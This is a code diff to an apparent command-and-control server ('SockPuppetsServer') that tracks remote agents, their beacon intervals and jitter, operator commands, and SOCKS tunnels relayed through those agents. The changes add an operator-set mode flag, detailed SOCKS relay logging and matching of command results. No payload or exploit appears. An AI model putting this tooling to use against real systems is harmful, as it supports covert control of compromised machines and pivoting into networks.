@@ -111,6 +111,7 @@ class Agent:
         self.command_history = []  # Track commands sent
         self.pending_kill = False
         self._interval_set_by_operator = False
+        self._mode_set_by_operator = False
         self.socks_task = None
         self.socks_server_obj = None
         self.command_sender_task = None  # Track send_commands task
@@ -488,7 +489,8 @@ class SockPuppetsServer:
                             # Update metadata if provided
                             metadata = data.get('metadata', {})
                             if metadata:
-                                agent.mode = metadata.get('mode', agent.mode)
+                                if not agent._mode_set_by_operator:
+                                    agent.mode = metadata.get('mode', agent.mode)
                                 if not agent._interval_set_by_operator:
                                     agent.beacon_interval = metadata.get('beacon_interval', agent.beacon_interval)
                                     agent.beacon_jitter = metadata.get('beacon_jitter', agent.beacon_jitter)
@@ -832,7 +834,8 @@ class SockPuppetsServer:
             self.events.emit({"event": "agent_checkin", "agent_id": agent_id, "transport": transport_type})
             metadata = data.get('metadata', {})
             if metadata:
-                agent.mode = metadata.get('mode', agent.mode)
+                if not agent._mode_set_by_operator:
+                    agent.mode = metadata.get('mode', agent.mode)
                 if not agent._interval_set_by_operator:
                     agent.beacon_interval = metadata.get('beacon_interval', agent.beacon_interval)
                     agent.beacon_jitter = metadata.get('beacon_jitter', agent.beacon_jitter)
@@ -849,6 +852,7 @@ class SockPuppetsServer:
                 msg_type = result.get('type', '')
                 if msg_type in ('socks_data', 'socks_close', 'socks_connect_ack', 'socks_error'):
                     conn_id = result.get('conn_id', '')
+                    logger.info(f"SOCKS result: type={msg_type} conn_id={conn_id} in_queues={conn_id in agent.socks_data_queues} data_len={len(result.get('data',''))}")
                     if conn_id and conn_id in agent.socks_data_queues:
                         if msg_type == 'socks_data':
                             socks_payload = result.get('data', '')
@@ -861,6 +865,8 @@ class SockPuppetsServer:
                             ))
                         elif msg_type == 'socks_error':
                             asyncio.ensure_future(agent.socks_data_queues[conn_id].put(None))
+                    else:
+                        logger.warning(f"SOCKS result for unknown conn_id={conn_id} (known: {list(agent.socks_data_queues.keys())})")
                     continue
 
                 output = result.get('output', '')
@@ -874,6 +880,24 @@ class SockPuppetsServer:
                     if len(agent.pending_results) > 200:
                         agent.pending_results = agent.pending_results[-200:]
                 else:
+                    cmd_id = result.get('command_id', '')
+                    resolved = False
+                    if cmd_id and cmd_id in agent.pending_commands:
+                        try:
+                            agent.pending_commands[cmd_id].set_result(output)
+                            del agent.pending_commands[cmd_id]
+                            resolved = True
+                        except (asyncio.InvalidStateError, KeyError):
+                            pass
+                    if not resolved:
+                        for cid, fut in list(agent.pending_commands.items()):
+                            if not fut.done():
+                                try:
+                                    fut.set_result(output)
+                                    del agent.pending_commands[cid]
+                                    break
+                                except asyncio.InvalidStateError:
+                                    pass
                     try:
                         agent.response_queue.put_nowait(output)
                     except asyncio.QueueFull:
@@ -1055,7 +1079,8 @@ class SockPuppetsServer:
                     # Update metadata if provided
                     metadata = data.get('metadata', {})
                     if metadata:
-                        agent.mode = metadata.get('mode', agent.mode)
+                        if not agent._mode_set_by_operator:
+                            agent.mode = metadata.get('mode', agent.mode)
                         if not agent._interval_set_by_operator:
                             agent.beacon_interval = metadata.get('beacon_interval', agent.beacon_interval)
                             agent.beacon_jitter = metadata.get('beacon_jitter', agent.beacon_jitter)
@@ -1418,6 +1443,7 @@ class SockPuppetsServer:
         if agent.is_http():
             # For HTTP agents, upgrade means switching to long-poll mode
             agent.mode = 'streaming'
+            agent._mode_set_by_operator = True
             logger.info(f"Agent {agent_id} upgraded to streaming/long-poll mode via {agent.transport_type.upper()}")
             return f"Agent upgraded to streaming mode (HTTP long-poll)"
 
@@ -1503,6 +1529,7 @@ class SockPuppetsServer:
             # For HTTP agents, just switch mode
             agent.mode = 'beacon'
             agent.beacon_interval = interval
+            agent._mode_set_by_operator = False
             logger.info(f"Agent {agent_id} downgraded to beacon mode ({interval}s) via {agent.transport_type.upper()}")
             return f"Agent downgraded to beacon mode ({interval}s interval)"
 
@@ -1813,8 +1840,9 @@ class SockPuppetsServer:
             while True:
                 data = await reader.read(4096)
                 if not data:
+                    logger.info(f"SOCKS relay->agent: client disconnected conn_id={conn_id}")
                     break
-
+                logger.info(f"SOCKS relay->agent: {len(data)} bytes conn_id={conn_id}")
                 msg = {
                     'type': 'socks_send',
                     'conn_id': conn_id,
@@ -1829,14 +1857,21 @@ class SockPuppetsServer:
         try:
             q = agent.socks_data_queues.get(conn_id)
             if not q:
+                logger.warning(f"SOCKS relay<-agent: no queue for conn_id={conn_id}")
                 return
+            logger.info(f"SOCKS relay<-agent: waiting for data conn_id={conn_id}")
             while True:
                 data = await q.get()
                 if data is None:
+                    logger.info(f"SOCKS relay<-agent: got None (close) conn_id={conn_id}")
                     break
                 if isinstance(data, str):
-                    data = base64.b64decode(data)
-                writer.write(data)
+                    decoded = base64.b64decode(data)
+                    logger.info(f"SOCKS relay<-agent: writing {len(decoded)} bytes conn_id={conn_id}")
+                    writer.write(decoded)
+                else:
+                    logger.info(f"SOCKS relay<-agent: writing {len(data)} raw bytes conn_id={conn_id}")
+                    writer.write(data)
                 await writer.drain()
         except Exception as e:
             logger.error(f"Relay to SOCKS error: {e}")
